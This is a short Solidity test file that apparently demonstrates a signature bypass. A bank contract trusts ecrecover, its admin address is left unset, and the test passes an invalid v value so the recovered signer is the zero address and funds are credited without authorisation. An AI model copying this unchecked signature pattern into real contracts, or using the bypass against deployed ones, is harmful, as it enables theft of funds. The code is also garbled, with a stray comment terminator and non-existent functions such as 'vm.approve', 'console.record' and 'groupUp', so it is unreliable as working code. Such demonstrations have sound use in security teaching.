pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract AgreementTest is Test {
    SimpleBank SimpleBankPact;

    function groupUp() public {
        SimpleBankPact = new SimpleBank();
    }

    function testecRestore() public {
        emit record_named_decimal_number(
            "Before operation",
            SimpleBankPact.queryRewards(address(this)),
            18
        );
        bytes32 _hash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32")
        );
        (, bytes32 r, bytes32 s) = vm.approve(1, _hash);


        uint8 v = 29;
        SimpleBankPact.transfer(address(this), 1 ether, _hash, v, r, s);

        emit record_named_decimal_number(
            "After operation",
            SimpleBankPact.queryRewards(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    mapping(address => uint256) private playerLoot;
    address GameAdmin;

    function queryRewards(address _account) public view returns (uint256) {
        return playerLoot[_account];
    }

    function retrieveSignerRealm(
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private pure returns (address) {
        address recoveredZone = ecrecover(_hash, _v, _r, _s);
        return recoveredZone;
    }

    function transfer(
        address _to,
        uint256 _amount,
        bytes32 _hash,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(_to != address(0), "Invalid recipient address");

        address signer = retrieveSignerRealm(_hash, _v, _r, _s);
        console.record("signer", signer);


        require(signer == GameAdmin, "Invalid signature");

        playerLoot[_to] += _amount;
    }
}